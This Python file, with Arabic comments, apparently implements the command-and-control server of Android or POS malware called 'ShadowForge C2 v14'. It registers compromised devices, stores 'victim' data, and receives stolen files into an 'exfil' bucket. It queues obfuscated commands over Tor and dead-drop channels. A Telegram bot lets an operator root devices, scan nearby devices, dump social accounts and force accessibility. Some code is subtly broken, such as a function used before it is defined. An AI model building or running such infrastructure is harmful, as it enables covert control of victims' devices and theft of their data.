#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
core_service_monitor.py – خادم القيادة والتحكم النووي v14
يدعم: تشفير لكل جهاز (ECDH + AES-GCM)، Dead Drops، Failover ذكي، Tor، هجمات محلية
"""

import os
import base64
import json
import hashlib
import hmac
import secrets
import threading
import logging
import time
import requests
from datetime import datetime
from flask import Flask, request, jsonify, abort
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import telebot
from telebot import apihelper
from supabase import create_client

# -------------------- استيراد الوحدات المساعدة --------------------
# (يجب أن تكون هذه الملفات موجودة في نفس المجلد)
from crypto_utils import CryptoManager
from connection_manager import ConnectionManager
from module_loader import ModuleLoader
from ai_obfuscator import AIObfuscator
from failover_tester import FailoverTester
from attack_modules import AttackOrchestrator

# -------------------- إعدادات البيئة --------------------
app = Flask(__name__)

# تخزين nonces المستخدمة
app.config['nonce_store'] = {}

# المتغيرات الإجبارية
MASTER_SECRET_B64 = os.environ.get('MASTER_SECRET_B64')
if not MASTER_SECRET_B64:
    raise ValueError("MASTER_SECRET_B64 is required")
MASTER_SECRET = base64.b64decode(MASTER_SECRET_B64)

SALT = os.environ.get('SALT', 'default-salt').encode()
ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
if ADMIN_ID == 0:
    raise ValueError("ADMIN_ID is required")

# بوتات تلغرام (قائمة مفصولة بفواصل)
BOT_TOKENS = os.environ.get('BOT_TOKENS', '').split(',')
if not BOT_TOKENS or not BOT_TOKENS[0]:
    raise ValueError("At least one BOT_TOKEN is required")

# روابط Supabase (قائمة مفصولة بفواصل)
SUPABASE_URLS = os.environ.get('SUPABASE_URLS', '').split(',')
SUPABASE_KEYS = os.environ.get('SUPABASE_KEYS', '').split(',')

# Dead Drops (GitHub Gists, Pastebin, إلخ)
DEAD_DROP_URLS = os.environ.get('DEAD_DROP_URLS', '').split(',')

# روابط GitHub raw كقناة احتياطية
GITHUB_RAW_URLS = os.environ.get('GITHUB_RAW_URLS', '').split(',')

# مفتاح الوصول للبوت (مشترك مع العميل)
ACCESS_KEY = os.environ.get('ACCESS_KEY')
if not ACCESS_KEY:
    raise ValueError("ACCESS_KEY is required")

# إعدادات Tor (اختياري)
TOR_PROXY = os.environ.get('TOR_PROXY', 'socks5h://127.0.0.1:9050')
USE_TOR = os.environ.get('USE_TOR', 'false').lower() == 'true'

# -------------------- تهيئة المديرين --------------------
crypto = CryptoManager(MASTER_SECRET, SALT)

config = {
    'telegram': {'tokens': BOT_TOKENS},
    'supabase': {'urls': SUPABASE_URLS, 'keys': SUPABASE_KEYS},
    'dead_drop': {'urls': DEAD_DROP_URLS},
    'github_raw': {'urls': GITHUB_RAW_URLS}
}

conn_mgr = ConnectionManager(config, crypto)
failover = FailoverTester(conn_mgr)
attack_orch = AttackOrchestrator(crypto, conn_mgr)
module_loader = ModuleLoader(crypto)
ai_obfuscator = AIObfuscator()

# تشغيل خلفية لفحص الاتصالات وتجديد المفاتيح
threading.Thread(target=failover.start_periodic_check, daemon=True).start()
threading.Thread(target=rotate_keys_periodically, daemon=True).start()

# عميل Supabase النشط (يُحدث تلقائياً)
supabase_active = None

def update_supabase_client():
    global supabase_active
    active = conn_mgr.get_active_supabase()
    if active:
        supabase_active = create_client(active['url'], active['key'])

update_supabase_client()

# -------------------- تخزين المفاتيح مع persistence --------------------
class KeyStorage:
    def __init__(self, crypto, supabase):
        self.crypto = crypto
        self.supabase = supabase
        self.cache = {}
        self.lock = threading.Lock()

    def get_key(self, device_id):
        with self.lock:
            # التحقق من الذاكرة المؤقتة
            if device_id in self.cache and self.cache[device_id]['expiry'] > datetime.utcnow().timestamp():
                return self.cache[device_id]['key']
            # محاولة التحميل من Supabase
            if self.supabase:
                try:
                    resp = self.supabase.table('device_keys').select('shared_key_enc', 'expiry').eq('device_id', device_id).execute()
                    if resp.data:
                        enc_key = resp.data[0]['shared_key_enc']
                        expiry = resp.data[0]['expiry']
                        if expiry > datetime.utcnow().timestamp():
                            key = self.crypto.decrypt_stored_key(base64.b64decode(enc_key))
                            self.cache[device_id] = {'key': key, 'expiry': expiry}
                            return key
                except:
                    pass
        return None

    def store_key(self, device_id, key, expiry):
        with self.lock:
            enc_key = base64.b64encode(self.crypto.encrypt_stored_key(key)).decode()
            if self.supabase:
                try:
                    self.supabase.table('device_keys').upsert({
                        'device_id': device_id,
                        'shared_key_enc': enc_key,
                        'expiry': expiry
                    }).execute()
                except:
                    pass
            self.cache[device_id] = {'key': key, 'expiry': expiry}

# إنشاء key_storage بعد تحديث supabase_active
key_storage = KeyStorage(crypto, supabase_active)

# تحديد معدل الطلبات
limiter = Limiter(get_remote_address, app=app, default_limits=["500 per day", "50 per hour"])
logging.basicConfig(level=logging.INFO)

# -------------------- مصادقة الأجهزة (HMAC + nonce) --------------------
def authenticate_device(request):
    device_id = request.headers.get('X-Device-ID')
    nonce = request.headers.get('X-Nonce')
    signature = request.headers.get('X-Signature')
    if not all([device_id, nonce, signature]):
        return None

    # التحقق من عدم تكرار nonce (ضد replay attacks)
    if not is_nonce_valid(device_id, nonce):
        return None

    device_key = key_storage.get_key(device_id)
    if not device_key:
        return None

    expected = hmac.new(device_key, f"{device_id}:{nonce}".encode(), hashlib.sha256).hexdigest()
    if hmac.compare_digest(expected, signature):
        return device_id
    return None

def is_nonce_valid(device_id, nonce):
    """تخزين nonces المستخدمة في قاموس مع صلاحية 5 دقائق"""
    key = f"{device_id}:{nonce}"
    if key in app.config['nonce_store']:
        return False
    app.config['nonce_store'][key] = time.time()
    # تنظيف الـ nonces القديمة
    if len(app.config['nonce_store']) > 1000:
        now = time.time()
        app.config['nonce_store'] = {k: v for k, v in app.config['nonce_store'].items() if now - v < 300}
    return True

# -------------------- تجديد المفاتيح الدوري --------------------
def rotate_keys_periodically():
    while True:
        time.sleep(3600)  # كل ساعة
        if supabase_active:
            try:
                supabase_active.table('device_keys').delete().lt('expiry', datetime.utcnow().timestamp()).execute()
            except:
                pass

# -------------------- نقاط نهاية الأجهزة --------------------
@app.route('/v14/register', methods=['POST'])
@limiter.limit("10 per minute")
def register_device():
    data = request.get_json()
    device_id = data.get('device_id')
    client_pub_b64 = data.get('public_key')
    if not device_id or not client_pub_b64:
        return jsonify({'error': 'Missing fields'}), 400

    # إنشاء زوج مفاتيح مؤقت للخادم
    server_priv, server_pub = crypto.generate_ephemeral_keypair()
    server_pub_b64 = base64.b64encode(server_pub.public_bytes_raw()).decode()
    client_pub_bytes = base64.b64decode(client_pub_b64)
    shared_key = crypto.compute_shared_secret(server_priv, client_pub_bytes)

    # صلاحية المفتاح: 12 ساعة
    expiry = datetime.utcnow().timestamp() + 43200
    key_storage.store_key(device_id, shared_key, expiry)

    if supabase_active:
        try:
            supabase_active.table('pos_clients').upsert({
                'client_serial': device_id,
                'public_key': client_pub_b64,
                'first_seen': datetime.utcnow().isoformat(),
                'last_seen': datetime.utcnow().isoformat()
            }).execute()
        except:
            pass

    return jsonify({
        'status': 'registered',
        'server_public_key': server_pub_b64,
        'key_expiry': expiry
    })

@app.route('/v14/pull', methods=['GET'])
def pull_commands():
    device_id = authenticate_device(request)
    if not device_id:
        abort(401)

    shared_key = key_storage.get_key(device_id)
    if not shared_key:
        abort(401)

    # جلب الأوامر المعلقة من جميع القنوات (بما فيها Dead Drops)
    commands = failover.fetch_pending_commands(device_id, supabase_active)

    encrypted_commands = []
    for cmd in commands:
        # تشويش الأمر باستخدام AI Obfuscator
        cmd_obfuscated = ai_obfuscator.obfuscate_command(cmd)
        cmd_json = json.dumps(cmd_obfuscated).encode()
        encrypted = crypto.encrypt_packet(shared_key, cmd_json, aad=device_id.encode())
        # إضافة ضوضاء عشوائية (256-768 بايت)
        padding_len = secrets.randbelow(512) + 256
        encrypted += secrets.token_bytes(padding_len)
        encrypted_commands.append(base64.b64encode(encrypted).decode())

    return jsonify(encrypted_commands)

@app.route('/v14/push', methods=['POST'])
def push_data():
    device_id = authenticate_device(request)
    if not device_id:
        abort(401)

    shared_key = key_storage.get_key(device_id)
    if not shared_key:
        abort(401)

    data = request.get_json()
    encrypted_payload = data.get('payload')
    if not encrypted_payload:
        abort(400)

    try:
        decoded = base64.b64decode(encrypted_payload)
        # إزالة الضوضاء (آخر 256-768 بايت)
        if len(decoded) > 256:
            actual = decoded[:len(decoded)-256]
        else:
            actual = decoded
        decrypted = crypto.decrypt_packet(shared_key, actual, aad=device_id.encode())
        payload = json.loads(decrypted.decode())
    except Exception as e:
        logging.error(f"Decryption failed: {e}")
        abort(400)

    # تحديث آخر ظهور في Supabase
    if supabase_active:
        try:
            supabase_active.table('pos_clients').update({
                'last_seen': datetime.utcnow().isoformat(),
                'victim_data_enc': crypto.encrypt_stored_key(json.dumps(payload.get('data', {})).encode()),
                'has_root': payload.get('data', {}).get('has_root', False),
                'has_accessibility': payload.get('data', {}).get('has_accessibility', False),
                'ip_address': request.remote_addr
            }).eq('client_serial', device_id).execute()
        except:
            pass

    # معالجة أنواع الحمولات المختلفة
    payload_type = payload.get('type')
    if payload_type == 'command_result':
        cmd_id = payload.get('command_id')
        result = payload.get('result')
        success = payload.get('success', True)
        if supabase_active and cmd_id:
            try:
                supabase_active.table('service_requests').update({
                    'ticket_status': 'done' if success else 'failed',
                    'resolution_log': result
                }).eq('ticket_id', cmd_id).execute()
            except:
                pass
        # إشعار المشرف عبر البوت
        failover.send_message_to_admin(f"Result from {device_id}:\n{result[:200]}")

    elif payload_type == 'file':
        filename = payload.get('filename')
        filedata = base64.b64decode(payload.get('data', ''))
        if supabase_active:
            try:
                storage_path = f"exfil/{device_id}/{filename}"
                supabase_active.storage.from_('exfil').upload(storage_path, filedata)
                failover.send_message_to_admin(f"File from {device_id}: {filename}")
            except:
                pass

    elif payload_type == 'network_scan':
        attack_orch.process_network_scan(device_id, payload.get('data'))

    elif payload_type == 'nearby_devices':
        attack_orch.process_nearby_devices(device_id, payload.get('data'))

    return jsonify({'status': 'ok'})

@app.route('/v14/config', methods=['GET'])
def get_config():
    device_id = authenticate_device(request)
    if not device_id:
        abort(401)

    shared_key = key_storage.get_key(device_id)
    if not shared_key:
        abort(401)

    current_config = conn_mgr.get_active_config()
    encrypted = crypto.encrypt_packet(
        shared_key,
        json.dumps(current_config).encode(),
        aad=device_id.encode()
    )
    return jsonify({'config': base64.b64encode(encrypted).decode()})

# -------------------- نقاط نهاية البوت (API للتحكم) --------------------
@app.route('/api/clients', methods=['GET'])
def list_clients():
    auth = request.headers.get('X-Service-Auth')
    if not auth or not hmac.compare_digest(auth, ACCESS_KEY):
        abort(401)

    if not supabase_active:
        return jsonify([])

    try:
        result = supabase_active.table('pos_clients').select('client_serial, operational_status, last_seen').execute()
        return jsonify(result.data)
    except:
        return jsonify([])

@app.route('/api/command', methods=['POST'])
def create_command():
    auth = request.headers.get('X-Service-Auth')
    if not auth or not hmac.compare_digest(auth, ACCESS_KEY):
        abort(401)

    data = request.json
    target = data.get('target_client')
    req_type = data.get('request_type')
    req_data = data.get('request_data', '')
    if not target or not req_type:
        return jsonify({'error': 'missing fields'}), 400

    if supabase_active:
        try:
            supabase_active.table('service_requests').insert({
                'target_client': target,
                'request_type': req_type,
                'request_data': req_data,
                'ticket_status': 'open'
            }).execute()
        except:
            pass
    return jsonify({'status': 'created'})

@app.route('/api/results', methods=['GET'])
def get_results():
    auth = request.headers.get('X-Service-Auth')
    if not auth or not hmac.compare_digest(auth, ACCESS_KEY):
        abort(401)

    if not supabase_active:
        return jsonify([])

    try:
        result = supabase_active.table('service_requests') \
            .select('target_client, resolution_log, updated_at') \
            .neq('resolution_log', None) \
            .order('updated_at', desc=True) \
            .limit(10) \
            .execute()
        return jsonify(result.data)
    except:
        return jsonify([])

# -------------------- بوت تلغرام المدمج --------------------
bot = telebot.TeleBot(BOT_TOKENS[0])
if USE_TOR:
    apihelper.proxy = {'https': TOR_PROXY}

@bot.message_handler(commands=['start', 'help'])
def help_command(message):
    if message.from_user.id != ADMIN_ID:
        return
    text = """
🚀 **ShadowForge C2 v14 – Nuclear Edition** 🚀

**Basic:**
/list – List devices
/cmd [id] [command] – Send command

**Advanced:**
/root [id] – Attempt auto-root
/nearby_scan [id] – Scan nearby devices
/social_dump [id] – Dump social accounts
/accessibility [id] – Force enable accessibility
"""
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['list'])
def list_devices(message):
    if message.from_user.id != ADMIN_ID:
        return
    if not supabase_active:
        bot.reply_to(message, "Supabase not available.")
        return
    try:
        resp = supabase_active.table('pos_clients').select('client_serial, last_seen, operational_status').order('last_seen', desc=True).limit(20).execute()
        devices = resp.data
        if not devices:
            bot.reply_to(message, "No devices registered.")
            return
        msg = "**Active devices:**\n"
        for d in devices:
            last = d.get('last_seen', 'unknown')[:16]
            status = "🟢" if d.get('operational_status') == 'online' else "🔴"
            msg += f"{status} `{d['client_serial']}` last: {last}\n"
        bot.reply_to(message, msg, parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

@bot.message_handler(commands=['cmd'])
def send_command(message):
    if message.from_user.id != ADMIN_ID or not supabase_active:
        return
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /cmd [device_id] [command]")
        return
    device_id, command = parts[1], parts[2]
    obfuscated = ai_obfuscator.obfuscate_command(command)
    try:
        supabase_active.table('service_requests').insert({
            'target_client': device_id,
            'request_type': obfuscated,
            'request_data': command,
            'ticket_status': 'open'
        }).execute()
        bot.reply_to(message, f"✅ Command `{command}` queued for `{device_id}`")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['root'])
def auto_root(message):
    if message.from_user.id != ADMIN_ID or not supabase_active:
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /root [device_id]")
        return
    device_id = parts[1]
    try:
        supabase_active.table('service_requests').insert({
            'target_client': device_id,
            'request_type': 'auto_root',
            'request_data': '{}',
            'ticket_status': 'open'
        }).execute()
        bot.reply_to(message, f"🔥 Root attempt queued for {device_id}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['nearby_scan'])
def nearby_scan(message):
    if message.from_user.id != ADMIN_ID or not supabase_active:
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /nearby_scan [device_id]")
        return
    device_id = parts[1]
    try:
        supabase_active.table('service_requests').insert({
            'target_client': device_id,
            'request_type': 'nearby_scan',
            'request_data': '{}',
            'ticket_status': 'open'
        }).execute()
        bot.reply_to(message, f"🔍 Network scan started from {device_id}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

# -------------------- تشغيل الخادم --------------------
def start_bot():
    bot.infinity_polling()

if __name__ == '__main__':
    threading.Thread(target=start_bot, daemon=True).start()
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
